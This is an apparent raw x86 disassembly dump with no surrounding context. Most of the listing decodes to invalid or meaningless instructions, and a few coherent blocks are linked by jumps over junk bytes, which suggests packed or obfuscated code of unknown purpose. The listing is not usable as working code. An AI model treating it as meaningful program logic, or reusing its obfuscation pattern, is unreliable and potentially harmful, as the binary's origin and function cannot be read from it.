  41435f:	mov    eax,ds:0xd3e6cdd1
  414364:	inc    ebp
  414365:	shl    eax,cl
  414367:	or     eax,0x34663192
  41436c:	and    BYTE PTR [ebx+ecx*8],0x70
  414370:	mov    al,0x4b
  414372:	shl    DWORD PTR [edi-0x402791a7],cl
  414378:	(bad)  
  414379:	xchg   esi,eax
  41437a:	loopne 0x414335
  41437c:	sar    BYTE PTR [ebx],0xa3
  41437f:	test   al,0x2a
  414381:	dec    ebp
  414382:	repz lea esi,[edi+esi*1-0x4307d89d]
  41438a:	iret   
  41438b:	das    
  41438c:	imul   esp,ebx,0x5b
  41438f:	xchg   ebp,eax
  414390:	dec    edx
  414391:	call   0xa933b4a
  414396:	mov    eax,ds
  414398:	clc    
  414399:	cmp    BYTE PTR [esp+esi*1-0x73cc9161],dh
  4143a0:	add    eax,0xaff3dea4
  4143a5:	sbb    BYTE PTR [eax+ebp*4-0x2eb21d4d],bh
  4143ac:	adc    eax,0x6f74e8ef
  4143b1:	pop    eax
  4143b2:	ins    BYTE PTR es:[edi],dx
  4143b3:	inc    ebp
  4143b4:	push   0xffffffc0
  4143b6:	sub    ebx,ebx
  4143b8:	sub    edx,ecx
  4143ba:	lea    edi,[edi+ebx*1+0x327298]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	test   BYTE PTR [ebx+ecx*4-0x17],dh
  4143e8:	ror    DWORD PTR [ecx],0x7f
  4143eb:	js     0x4143d2
  4143ed:	jle    0x414467
  4143ef:	js     0x414426
  4143f1:	out    dx,al
  4143f2:	and    cl,BYTE PTR [edi+0x63]
  4143f5:	mov    eax,DWORD PTR cs:[ebx+0x30b3c156]
  4143fc:	cmp    BYTE PTR [edi-0x35],dl
  4143ff:	mov    bh,0xa
  414401:	je     0x4143ae
  414403:	adc    eax,0x71e65d6d
  414408:	mov    eax,ebx
  41440a:	xchg   ebp,eax
  41440b:	(bad)  
  41440c:	xor    BYTE PTR [ecx-0x75e42bec],dl
  414412:	pop    ds
  414413:	jb     0x41443e
  414415:	and    DWORD PTR [ebp+0x3e671bad],ebx
  41441b:	inc    ecx
  41441c:	sti    
  41441d:	cmp    edi,edi
  41441f:	xor    esp,DWORD PTR fs:[edi+0x36737131]
  414426:	adc    edx,DWORD PTR [ebp-0x56decc5f]
  41442c:	jl     0x41444a
  41442e:	clc    
  41442f:	cld    
  414430:	rcl    BYTE PTR [edx],1
  414432:	(bad)  
  414433:	or     dh,BYTE PTR [ebp-0x11]
  414436:	dec    esi
  414437:	adc    BYTE PTR [esi-0x2b4301cc],al
  41443d:	stos   DWORD PTR es:[edi],eax
  41443e:	inc    edx
  41443f:	adc    eax,0xe19e7c8d
  414444:	icebp  
  414445:	pop    ss
  414446:	shl    DWORD PTR [eax+0x3b5c0e97],0xec
  41444d:	aaa    
  41444e:	jge    0x414469
  414450:	nop
  414451:	mov    ch,BYTE PTR [edx]
  414453:	adc    BYTE PTR [ebx+0x6c],bh
  414456:	stos   DWORD PTR es:[edi],eax
  414457:	pusha  
  414458:	lock outs dx,DWORD PTR ds:[esi]
  41445a:	js     0x414487
  41445c:	jl     0x4144c1
  41445e:	push   0xd9f6abbf
  414463:	outs   dx,DWORD PTR ds:[esi]
  414464:	xlat   BYTE PTR ds:[ebx]
  414465:	test   DWORD PTR [eax+0x78cf9a05],edi
  41446b:	fwait
  41446c:	pop    edi
  41446d:	dec    esp
  41446e:	mov    esp,DWORD PTR gs:[ecx+0x3bfd465d]
  414475:	push   ss
  414476:	fs mov ecx,0x8172853e
  41447c:	loop   0x414424
  41447e:	dec    ebp
  41447f:	jmp    0x41440b
  414481:	addr16 iret 
  414483:	sbb    BYTE PTR [edi-0x64],ah
  414486:	je     0x41442b
  414488:	cmp    bh,ch
  41448a:	jecxz  0x414503
  41448c:	pop    esi
  41448d:	jmp    0x41448e
  41448f:	mov    ebp,0x9ef6f25d
  414494:	fwait
  414495:	sub    cl,BYTE PTR [esi-0x3e]
  414498:	cwde   
  414499:	icebp  
  41449a:	stos   DWORD PTR es:[edi],eax
  41449b:	(bad)  
  41449d:	mov    ecx,0x2b34d5b9
  4144a2:	fwait
  4144a3:	scas   al,BYTE PTR es:[edi]
  4144a4:	inc    esp
  4144a5:	and    eax,0x346c7c9a
  4144aa:	pusha  
  4144ab:	xor    cl,ch
  4144ad:	test   al,0x63
  4144af:	sar    DWORD PTR [ebp+0x1],cl
  4144b2:	push   es
  4144b3:	xchg   DWORD PTR [esi-0xbc47ae8],esi
  4144b9:	adc    al,0x7d
  4144bb:	inc    edi
  4144bc:	mov    ecx,0x30cbf711
  4144c1:	add    BYTE PTR [edx],ch
  4144c3:	inc    edi
  4144c4:	mov    esp,0xbce4a033
  4144c9:	enter  0x91a0,0x46
  4144cd:	mov    ds:0x7fc35c3e,eax
  4144d2:	sub    bh,BYTE PTR [edx]
  4144d4:	out    dx,al
  4144d5:	lea    ecx,[ebx-0x6a9c866d]
  4144db:	out    dx,al
  4144dc:	fst    QWORD PTR [esi-0x55540f9f]
  4144e2:	push   cs
  4144e3:	mov    ebx,0xdc7e0dd5
  4144e8:	xchg   edi,eax
  4144e9:	inc    eax
  4144ea:	sub    ebx,ebx
  4144ec:	pop    ss
  4144ed:	adc    al,0x70
  4144ef:	pavgb  mm5,mm6
  4144f2:	clc    
  4144f3:	dec    esp
  4144f4:	rcr    BYTE PTR [edi],0x39
  4144f7:	sti    
  4144f8:	aaa    
  4144f9:	lahf   
  4144fa:	and    al,0x4f
  4144fc:	repz cmp eax,0x465d3215
  414502:	mov    bl,0x95
  414504:	xor    DWORD PTR [ebx+ecx*1+0x2ce82b02],0xffffffa9
  41450c:	xor    eax,0xa713d566
  414511:	dec    esi
  414512:	into   
  414513:	mov    al,ds:0xedff8804
  414518:	mov    bh,0x66
  41451a:	pop    ebx
  41451b:	push   edx
  41451c:	mov    BYTE PTR ds:0xc3b9cf03,bh
  414522:	lods   al,BYTE PTR ds:[esi]
  414523:	cwde   
  414524:	cmp    eax,0x3eb91059
  414529:	jmp    0x4144c8
  41452b:	sbb    al,0xaf
  41452d:	inc    ecx
  41452e:	pop    ss
  41452f:	and    ebx,DWORD PTR [ecx+eiz*4]
  414532:	xor    al,0xb0
  414534:	dec    ebx
  414535:	call   0x30175514
  41453a:	xchg   ecx,eax
  41453b:	aaa    
  41453c:	or     dh,BYTE PTR [edx+0x3f17ae10]
  414542:	iret   
  414543:	out    dx,eax
  414544:	jmp    0x602fe780
  414549:	jns    0x4144de
  41454b:	inc    esi
  41454c:	adc    eax,0xbf8d4003
  414551:	mov    eax,0x5dc3c0
  414556:	xchg   esp,eax
  414557:	xor    eax,0xe6ea2952
  41455c:	mov    esp,0x2d34e8bd
  414561:	push   ss
  414562:	fistp  DWORD PTR [edx+ecx*1]
  414565:	sbb    eax,DWORD PTR es:[ebp-0x5145e60c]
  41456c:	mov    dl,0x8a
  41456e:	sahf   
  41456f:	cmp    al,0x42
  414571:	sub    eax,0xb4a5216a
  414576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414577:	aaa    
  414578:	jmp    0x4145d2
  41457a:	(bad)  
  41457b:	mov    BYTE PTR [ebx-0x8577919],ah
  414581:	jne    0x414590
  414583:	int3   
  414584:	ds add al,0xf9
  414587:	jae    0x414516
  414589:	aaa    
  41458a:	sub    eax,0x14e08235
  41458f:	(bad)  
  414590:	xchg   edx,eax
  414591:	mov    ah,0x9
  414593:	test   BYTE PTR [edx+eiz*1],dl
  414596:	cmp    DWORD PTR [esi-0x51138a2f],ebp
  41459c:	adc    al,0xf6
  41459e:	rcl    BYTE PTR [edx+eiz*2+0x1268c24],cl
  4145a5:	xor    ebx,ecx
  4145a7:	sar    ebp,0x3e
  4145aa:	nop
  4145ab:	pop    ss
  4145ac:	scas   al,BYTE PTR es:[edi]
  4145ad:	inc    ecx
  4145ae:	lea    ebx,[ecx+0x5c]
  4145b1:	stos   BYTE PTR es:[edi],al
  4145b2:	iret   
  4145b3:	pop    ecx
  4145b4:	cmp    ebp,esi
  4145b6:	nop
  4145b7:	sub    ch,BYTE PTR ds:0x1b6ee156
  4145bd:	ja     0x4145b0
  4145bf:	aas    
  4145c0:	aaa    
  4145c1:	pop    esi
  4145c2:	dec    edx
  4145c3:	test   eax,0x5420c7f0
  4145c8:	in     eax,0x1
  4145ca:	in     al,0xb8
  4145cc:	outs   dx,BYTE PTR ds:[esi]
  4145cd:	push   0xb6df0239
  4145d2:	call   0x9a648465
  4145d7:	fcmove st,st(4)
  4145d9:	mov    BYTE PTR [eax],0xdb
  4145dc:	adc    al,0x16
  4145de:	jb     0x414608
  4145e0:	call   0xfb2a:0x65fe72a7
  4145e7:	jmp    0x1cfa:0x81677686
  4145ee:	clc    
  4145ef:	sbb    al,0xa5
  4145f1:	pop    es
  4145f2:	ds dec ebp
  4145f4:	sub    DWORD PTR [edi-0x35995941],esp
  4145fa:	dec    ebp
  4145fb:	scas   al,BYTE PTR es:[edi]
  4145fc:	cmp    eax,0x485ead46
  414601:	imul   ecx,DWORD PTR [ebx-0x609c1c5e],0xb90bd081
  41460b:	out    0x63,al
  41460d:	scas   eax,DWORD PTR es:[edi]
  41460e:	(bad)  
  41460f:	cli    
  414610:	mov    cl,0x2d
  414612:	clc    
  414613:	adc    DWORD PTR [ecx*1+0xbd7e2e6],esi
  41461a:	push   ecx
  41461b:	jmp    0x9c2fd53b
  414620:	sub    eax,0x721be678
  414625:	(bad)  
  414626:	mov    edi,0x2ad9b52a
  41462b:	arpl   WORD PTR [esp+edx*1],ax
  41462e:	lahf   
  41462f:	shl    ebx,cl
  414631:	cdq    
  414632:	arpl   WORD PTR [ebx],cx
  414634:	mov    ecx,0x6948dfad
  414639:	sub    ch,BYTE PTR [ebx-0x25332c87]
  41463f:	sti    
  414640:	clc    
  414641:	adc    bl,ch
  414643:	aam    0x7a
  414645:	adc    eax,0xe82ef24
  41464a:	inc    ebp
  41464b:	int3   
  41464c:	lds    esi,FWORD PTR [edi-0xe]
  41464f:	mov    eax,ds:0x919d86f7
  414654:	sbb    al,0xe
  414656:	add    eax,0xd3b1033d
  41465b:	imul   edx,edi
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	sbb    BYTE PTR [esi-0x39],0x35
  414675:	je     0x414625
  414677:	movq   QWORD PTR [eax-0x1b],mm7
  41467b:	jle    0x4146f5
  41467d:	js     0x4146d3
  41467f:	pop    ebx
  414680:	push   eax
  414681:	gs inc esi
  414683:	or     eax,0xb23ae609
  414688:	outs   dx,BYTE PTR ds:[esi]
  414689:	out    dx,eax
  41468a:	pop    edx
  41468b:	ret    
  41468c:	sub    ebp,DWORD PTR [ebx+0x377c8aa4]
  414692:	retf   0x605b
  414695:	repz cmp ebp,DWORD PTR [ecx+0x7b669cb2]
  41469c:	mov    BYTE PTR [ebp+0x5f],ch
  41469f:	jecxz  0x414674
  4146a1:	mov    bh,0x4e
  4146a3:	mov    ch,0x98
  4146a5:	xor    eax,0xeb89a0f1
  4146aa:	or     BYTE PTR [ecx+0xb],dh
  4146ad:	xchg   ebx,eax
  4146ae:	push   edi
  4146af:	sbb    eax,0x32ad8a0b
  4146b4:	dec    ebx
  4146b5:	or     ah,cl
  4146b7:	sub    DWORD PTR [esi-0x51a29500],ebx
  4146bd:	(bad)  
  4146be:	outs   dx,DWORD PTR ds:[esi]
  4146bf:	imul   eax,DWORD PTR [ebp-0x1a79b9ac],0xffffffee
  4146c6:	jbe    0x414715
  4146c8:	sub    eax,0xaa94ce8e
  4146cd:	ins    BYTE PTR es:[edi],dx
  4146ce:	dec    eax
  4146cf:	nop    DWORD PTR [edx-0x38]
  4146d3:	or     BYTE PTR [edi+0x37],0x9e
  4146d7:	push   ss
  4146d8:	div    BYTE PTR [ecx]
  4146da:	bnd jnp 0x4146bb
  4146dd:	mov    esi,0xfcac5797
  4146e2:	jecxz  0x41467a
  4146e4:	pop    esp
  4146e5:	sub    edx,DWORD PTR [edx+ebx*8]
  4146e8:	fdivr  DWORD PTR [edx]
  4146ea:	mov    cl,0x9b
  4146ec:	ins    DWORD PTR es:[edi],dx
  4146ed:	xor    ebp,esp
  4146ef:	inc    ecx
  4146f0:	loopne 0x4146cf
  4146f2:	push   edx
  4146f3:	daa    
  4146f4:	fs std 
  4146f6:	push   ebx
  4146f7:	pop    esi
  4146f8:	es pop edi
  4146fa:	or     edi,DWORD PTR [eax-0x80]
  4146fd:	xor    DWORD PTR [edi+0x6],0x258e179f
  414704:	lods   al,BYTE PTR ds:[esi]
  414705:	leave  
  414706:	and    cl,BYTE PTR [ebx+0x3a]
  414709:	mov    ds:0xcf01454,eax
  41470e:	and    DWORD PTR [esi-0x2c],ebx
  414711:	jg     0x414789
  414713:	sbb    ebx,esi
  414715:	ret    
  414716:	arpl   WORD PTR [eax-0x10c9d983],cx
  41471c:	sti    
  41471d:	pop    esp
  41471e:	inc    eax
  41471f:	push   es
  414720:	adc    esi,edx
  414722:	arpl   WORD PTR [eax-0x57faa4cf],dx
  414728:	stc    
  414729:	mov    al,0x2
  41472b:	out    dx,al
  41472c:	add    bh,bh
  41472e:	push   es
  41472f:	clc    
  414730:	std    
  414731:	dec    ebp
  414732:	jecxz  0x414714
  414734:	jmp    0x414786
  414736:	or     eax,0x1312f943
  41473b:	hlt    
  41473c:	(bad)  
  41473d:	ins    BYTE PTR es:[edi],dx
  41473e:	mov    BYTE PTR ds:0x3dc3395,0x0
  414745:	push   ds
  414746:	push   ss
  414747:	cmp    ebx,DWORD PTR [ebx]
  414749:	pop    edx
  41474a:	dec    ebx
  41474b:	mov    ebp,0xd082c05d
  414750:	fild   WORD PTR [esi-0x54fd00a]
  414756:	sbb    esi,DWORD PTR [edx+0x1dc2b30]
  41475c:	int    0x32
  41475e:	mov    ds:0xdd3b07ee,al
  414763:	ds push 0x2
  414766:	cmp    edi,DWORD PTR [ebx-0x62]
  414769:	out    0xa,eax
  41476b:	mov    bl,0xad
  41476d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41476e:	or     DWORD PTR [ecx-0x505e9188],esp
  414774:	outs   dx,BYTE PTR ds:[esi]
  414775:	mov    ds:0x1b6d1be2,eax
  41477a:	enter  0xf591,0xe1
  41477e:	les    ebp,FWORD PTR [ebx]
  414780:	fimul  WORD PTR [esi+0x48]
  414783:	inc    eax
  414784:	shl    BYTE PTR [ebx-0x9796ed4],cl
  41478a:	and    ah,ch
  41478c:	out    0xc4,eax
  41478e:	jbe    0x414797
  414790:	clc    
  414791:	push   edi
  414792:	outs   dx,DWORD PTR ds:[esi]
  414793:	cmp    edx,ebx
  414795:	(bad)  
  414796:	loopne 0x414814
  414798:	mov    eax,ds:0x49e4a497
  41479d:	ins    DWORD PTR es:[edi],dx
  41479e:	mov    al,ds:0xd4001c78
  4147a3:	dec    esi
  4147a4:	mov    ds:0xc40dbf1f,al
  4147a9:	hlt    
  4147aa:	inc    edx
  4147ab:	movhps QWORD PTR [edi+0xa77c11d],xmm0
  4147b2:	scas   eax,DWORD PTR es:[edi]
  4147b3:	neg    ah
  4147b5:	jmp    0x29c73ecb
  4147ba:	or     eax,0xc3d3af9b
  4147bf:	xchg   cl,cl
  4147c1:	call   FWORD PTR ds:0xf867db75
  4147c7:	mov    ch,BYTE PTR [edi-0x2a]
  4147ca:	sub    eax,0x42d3c628
  4147cf:	nop
  4147d0:	sub    DWORD PTR [eax],edi
  4147d2:	cs (bad) 
  4147d6:	loope  0x41478c
  4147d8:	fild   QWORD PTR [edx]
  4147da:	je     0x4147b8
  4147dc:	adc    BYTE PTR [eax-0x34e7fb7],dh
  4147e2:	out    0xf3,al
  4147e4:	push   ebp
  4147e5:	aas    
  4147e6:	push   esi
  4147e7:	inc    ebp
  4147e8:	loop   0x414778
  4147ea:	in     eax,0xd4
  4147ec:	data16 cli 
  4147ee:	mov    al,ds:0x7a798a54
  4147f3:	mov    ch,0x81
  4147f5:	inc    ecx
  4147f6:	imul   esi,DWORD PTR [edx+ebp*4-0x2e27e2af],0x6e
  4147fe:	xor    eax,0x40708b2
  414803:	push   ebp
  414804:	jp     0x4147e1
  414806:	sbb    BYTE PTR [ebp+0x65],0x37
  41480a:	and    al,BYTE PTR [ebp+0x5d]
  41480d:	(bad)  
  41480e:	arpl   si,bp
  414810:	jmp    0x5d9c7637
  414815:	xchg   DWORD PTR [ecx],esp
  414817:	mov    bh,0xb3
  414819:	jnp    0x4147a2
  41481b:	dec    edx
  41481c:	pop    edi
  41481d:	sub    BYTE PTR [edi+0x245a4135],dl
  414823:	cmc    
  414824:	std    
  414825:	mov    dh,BYTE PTR [ebx-0x38]
  414828:	adc    eax,0x165e2c91
  41482d:	xor    al,0x8e
  41482f:	in     eax,0xe4
  414831:	push   ss
  414832:	sub    esp,DWORD PTR [eax]
  414834:	xchg   DWORD PTR ds:0xa31d6717,esi
  41483a:	jnp    0x414840
  41483c:	rcr    BYTE PTR [eax-0x77],cl
  41483f:	mov    cs,WORD PTR [edi]
  414841:	mov    esp,0xc44a0ec8
  414846:	(bad)  
  414848:	repz push ebp
  41484a:	loopne 0x4148c9
  41484c:	lods   eax,DWORD PTR ds:[esi]
  41484d:	lods   eax,DWORD PTR ds:[esi]
  41484e:	sbb    esi,esp
  414850:	(bad)  
  414851:	lock sbb al,0xc9
  414854:	(bad)  
  414855:	sbb    DWORD PTR [esi],ebp
  414857:	jno    0x414842
  414859:	cld    
  41485a:	imul   edx,DWORD PTR [eax-0xc],0x15
  41485e:	sahf   
  41485f:	mul    edx
  414861:	mov    bh,0xc9
  414863:	sbb    al,0x9d
  414865:	adc    dh,ch
  414867:	cli    
  414868:	mov    ch,0xf3
  41486a:	jecxz  0x4147fb
  41486c:	sub    al,0x2b
  41486e:	sbb    DWORD PTR [edi-0x3b],edx
  414871:	cmp    ah,ah
  414873:	mov    al,0x52
  414875:	mov    al,ds:0x12c47dbf
  41487a:	mov    cl,0xf
  41487d:	adc    DWORD PTR [esp+ebx*4-0xa4e520c],edi
  414884:	lods   eax,DWORD PTR ds:[esi]
  414885:	cmp    DWORD PTR [esi],0xffffffc6
  414888:	cli    
  414889:	pop    esp
  41488a:	je     0x41482d
  41488c:	xchg   esp,eax
  41488d:	aad    0x43
  41488f:	dec    ebx
  414890:	adc    dh,BYTE PTR [ecx]
  414892:	cmp    bl,BYTE PTR [esi+0x6a]
  414895:	inc    ecx
  414896:	call   0xcca8:0x6325f11
  41489d:	out    dx,eax
  41489e:	dec    ebp
  41489f:	les    esp,FWORD PTR [edi-0x3d9628ca]
  4148a5:	jmp    0x94f5:0xc6c9
  4148ab:	std    
  4148ac:	cmc    
  4148ad:	mov    ebp,DWORD PTR [ebx+0xa]
  4148b0:	sub    bl,dh
  4148b2:	loope  0x414895
  4148b4:	xchg   DWORD PTR [ecx],ecx
  4148b6:	ins    DWORD PTR es:[edi],dx
  4148b7:	mov    ch,0xea
  4148b9:	cmp    ah,BYTE PTR [ebp-0x9]
  4148bc:	mov    al,0xe4
  4148be:	inc    ecx
  4148bf:	sbb    al,0xb7
  4148c1:	fistp  QWORD PTR [ebx]
  4148c3:	ficomp WORD PTR [ebp+0x1e]
  4148c6:	popa   
  4148c7:	shl    BYTE PTR [eax+0x4db524e8],0x77
  4148ce:	jg     0x4148de
  4148d0:	lods   al,BYTE PTR ds:[esi]
  4148d1:	jl     0x4148d7
  4148d3:	mov    ecx,DWORD PTR [ecx]
  4148d5:	test   cl,bh
  4148d7:	pop    ecx
  4148d8:	add    DWORD PTR [edx-0x4b],ebp
  4148db:	mov    dh,0x66
  4148dd:	add    eax,0xe675b53d
  4148e2:	stc    
  4148e3:	andps  xmm0,XMMWORD PTR [ebx-0x2]
  4148e7:	fsubr  DWORD PTR [edx-0x28fc07cd]
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax+0x1527854b]
  414921:	call   0x787f:0xc1ba203
  414928:	in     eax,0x7e
  41492a:	js     0x4149a4
  41492c:	inc    esp
  41492d:	scas   al,BYTE PTR es:[edi]
  41492e:	fs lock ins DWORD PTR es:[edi],dx
  414931:	ds loop 0x414935
  414934:	push   esp
  414935:	xchg   BYTE PTR [esi+0x2],dh
  414938:	leave  
  414939:	dec    ebx
  41493a:	stos   DWORD PTR es:[edi],eax
  41493b:	shl    BYTE PTR ds:0x804fba46,1
  414941:	dec    esp
  414942:	adc    DWORD PTR [eax-0x77fccba7],edi
  414948:	test   eax,0xdec9aff8
  41494d:	das    
  41494e:	punpcklbw mm4,DWORD PTR [esi]
  414951:	bound  ecx,QWORD PTR [edx+0x56b254f8]
  414957:	mov    ds:0x963000e0,eax
  41495c:	xchg   esi,eax
  41495d:	or     ebx,DWORD PTR [ebp+0x30]
  414960:	cs pop ds
  414962:	push   cs
  414963:	xlat   BYTE PTR ds:[ebx]
  414964:	lahf   
  414965:	mov    eax,0x16dd1c2a
  41496a:	repnz push ecx
  41496c:	jg     0x41498f
  41496e:	ret    0x6c58
  414971:	cli    
  414972:	xchg   edi,eax
  414973:	xchg   WORD PTR [ebp+0x67],di
  414977:	mov    ss,WORD PTR [edi]
  414979:	jmp    0x5eba8e17
  41497e:	adc    al,bl
  414980:	or     edi,edi
  414982:	jne    0x41493a
  414984:	bound  ebx,QWORD PTR [ebp+ebx*2+0x15fbee35]
  41498b:	inc    ebx
  41498c:	push   ebp
  41498d:	in     al,0x65
  41498f:	rol    DWORD PTR [eax],1
  414991:	out    0xe4,al
  414993:	cmp    al,0x5
  414995:	sub    BYTE PTR [eax+0x5e9748f1],ah
  41499b:	fidiv  DWORD PTR [edx]
  41499d:	hlt    
  41499e:	mov    bh,0x98
  4149a0:	mov    edx,0x99423aec
  4149a5:	push   es
  4149a6:	icebp  
  4149a7:	frstor [edx-0x6c34f044]
  4149ad:	cmp    ebx,edi
  4149af:	sahf   
  4149b0:	iret   
  4149b1:	int3   
  4149b2:	dec    ecx
  4149b3:	mov    eax,ds:0x12564f90
  4149b8:	xchg   BYTE PTR [ecx],dl
  4149ba:	xchg   ebp,eax
  4149bb:	mov    al,ds:0x663e4a1e
  4149c0:	ror    BYTE PTR [eax+0x455c61ae],0x3b
  4149c7:	out    0x6d,al
  4149c9:	mov    ch,0xa1
  4149cb:	int3   
  4149cc:	outs   dx,BYTE PTR ds:[esi]
  4149cd:	imul   esp,DWORD PTR [edx-0x44bc0f88],0x133c5649
  4149d7:	sub    BYTE PTR [edi],bh
  4149d9:	push   0xffffffc7
  4149db:	push   edx
  4149dc:	sahf   
  4149dd:	xor    DWORD PTR ds:0x583f0b2e,ebp
  4149e3:	jnp    0x4149a8
  4149e5:	mov    dl,0xec
  4149e7:	cmove  esi,DWORD PTR [esi]
  4149ea:	neg    DWORD PTR [esi+0x1b]
  4149ed:	test   BYTE PTR [ebx+0x6],bh
  4149f0:	pop    esi
  4149f1:	fidivr WORD PTR [esi-0x3c6673a6]
  4149f7:	push   ds
  4149f8:	daa    
  4149f9:	sbb    BYTE PTR [esi-0x3],0xe2
  4149fd:	push   cs
  4149fe:	dec    edi
  4149ff:	push   esi
  414a00:	sbb    BYTE PTR [edi-0x505f3c98],ch
  414a06:	clc    
  414a07:	repnz bound esp,QWORD PTR [eax+0x1c6f2f8e]
  414a0e:	aad    0x8f
  414a10:	pop    ebx
  414a11:	icebp  
  414a12:	or     DWORD PTR [ebp+esi*4+0x7d],edi
  414a16:	or     bl,dl
  414a18:	ror    BYTE PTR [eax],0xdf
  414a1b:	push   0x69da77d1
  414a20:	int3   
  414a21:	pop    esi
  414a22:	in     eax,dx
  414a23:	sub    eax,0xd1ab92ca
  414a28:	sub    eax,0xee569151
  414a2d:	jmp    0x882f:0xaa4e0bdf
  414a34:	lods   eax,DWORD PTR ds:[esi]
  414a35:	aas    
  414a36:	out    0x96,al
  414a38:	(bad)  
  414a39:	cmp    eax,0x27769b75
  414a3e:	stos   DWORD PTR es:[edi],eax
  414a3f:	cmp    al,0x8f
  414a41:	(bad)  
  414a43:	mov    ebp,0x6b4353fe
  414a48:	xchg   edi,eax
  414a49:	repnz sbb bh,dh
  414a4c:	pop    es
  414a4d:	jg     0x4149d5
  414a4f:	repz loope 0x4149f6
  414a52:	push   ss
  414a53:	jge    0x414a9e
  414a55:	adc    DWORD PTR [esi-0x77],esi
  414a58:	mov    ds:0x3c8ee611,eax
  414a5d:	push   edi
  414a5e:	lock lea eax,[ecx]
  414a61:	test   eax,0x18ea69a8
  414a66:	inc    ebp
  414a67:	mov    eax,?
  414a69:	cld    
  414a6a:	out    dx,al
  414a6b:	clc    
  414a6c:	push   esi
  414a6d:	inc    eax
  414a6e:	xchg   al,ah
  414a70:	sub    eax,0x689b045d
  414a75:	ins    DWORD PTR es:[edi],dx
  414a76:	sahf   
  414a77:	inc    edi
  414a78:	std    
  414a79:	loop   0x414aa3
  414a7b:	push   ebx
  414a7c:	sub    DWORD PTR [esi-0x1e],0x16
  414a80:	es xchg eax,ebp
  414a83:	adc    cl,BYTE PTR [edi+0x65]
  414a86:	sub    bh,0xb8
  414a89:	into   
  414a8a:	xchg   ebx,eax
  414a8b:	xor    edi,esi
  414a8d:	inc    ebx
  414a8e:	enter  0xc035,0xf
  414a92:	or     eax,0x1e9cfdbc
  414a97:	add    bh,BYTE PTR [eax]
  414a99:	jbe    0x414a76
  414a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a9c:	mov    al,ds:0x22e96e3f
  414aa1:	lock xchg BYTE PTR ds:0x8d1fea52,cl
  414aa9:	cmc    
  414aaa:	sbb    eax,0x68d077bc
  414aaf:	mov    BYTE PTR [ebp+0x1a2b0132],0xbb
  414ab6:	mov    edi,0x62acb605
  414abb:	sub    cl,BYTE PTR [esp+edi*4-0x3]
  414abf:	ins    BYTE PTR es:[edi],dx
  414ac0:	or     esi,DWORD PTR [edx+0x74]
  414ac3:	xlat   BYTE PTR ds:[ebx]
  414ac4:	mov    edx,0x75b5caf7
  414ac9:	xchg   DWORD PTR [edx-0x5],edi
  414acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414acd:	jl     0x414b4d
  414acf:	fisttp DWORD PTR [ebx+0x1e]
  414ad2:	adc    BYTE PTR [eax-0x72],ah
  414ad5:	mov    ?,ecx
  414ad7:	loop   0x414a91
  414ad9:	sub    eax,0x7ae963ba
  414ade:	pop    ecx
  414adf:	imul   ecx,DWORD PTR [edi+0x751f8c7b],0x3802fb00
  414ae9:	shr    bl,cl
  414aeb:	xor    bh,BYTE PTR [edi]
  414aed:	ins    DWORD PTR es:[edi],dx
  414aee:	push   0x2ff5ba51
  414af3:	out    dx,al
  414af4:	xor    DWORD PTR [ebx-0x35],esi
  414af7:	test   eax,0x22196c51
  414afc:	int3   
  414afd:	jl     0x414ac1
  414aff:	iret   
  414b00:	rol    DWORD PTR [edi],0xa0
  414b03:	mov    al,0x6d
  414b05:	mov    gs,WORD PTR [edx]
  414b07:	fld    TBYTE PTR [esi+edx*2+0x1668f30b]
  414b0e:	int    0x14
  414b10:	into   
  414b11:	mov    eax,DWORD PTR [ecx+0x57]
  414b14:	push   esi
  414b15:	or     ebp,DWORD PTR [esi+0x0]
  414b18:	test   eax,0xc40f44be
  414b1d:	push   ecx
  414b1e:	xchg   edx,eax
  414b1f:	aam    0x9f
  414b21:	sub    ecx,DWORD PTR [ebp+0x78]
  414b24:	outs   dx,DWORD PTR ds:[esi]
  414b25:	dec    ecx
  414b26:	pop    esp
  414b27:	inc    ebp
  414b28:	fsub   st,st(1)
  414b2a:	inc    ecx
  414b2b:	inc    esp
  414b2c:	cdq    
  414b2d:	in     al,0xa5
  414b2f:	rol    ebx,0x71
  414b32:	aam    0x57
  414b34:	dec    eax
  414b35:	(bad)  
  414b37:	leave  
  414b38:	xchg   BYTE PTR [ecx+eax*8],dh
  414b3b:	(bad)  
  414b3c:	js     0x414bb6
  414b3e:	and    eax,0x2b2a8d4d
  414b43:	or     ah,bl
  414b45:	popf   
  414b46:	test   DWORD PTR [edx+0x37],eax
  414b49:	or     eax,DWORD PTR [ebp+0x10]
  414b4c:	jae    0x414ba4
  414b4e:	xchg   edx,eax
  414b4f:	(bad)  
  414b50:	ss int 0x91
  414b53:	xor    BYTE PTR [edi],bh
  414b55:	repnz fcomi st,st(7)
  414b58:	dec    esp
  414b59:	gs xchg ebx,eax
  414b5b:	mov    ds,WORD PTR [edi-0xd77efa2]
  414b61:	sbb    BYTE PTR [edi-0x30fe7489],al
  414b67:	xor    al,BYTE PTR [ecx]
  414b69:	jo     0x414b1c
  414b6b:	retf   
  414b6c:	xchg   eax,ebp
  414b6e:	cmc    
  414b6f:	aad    0x16
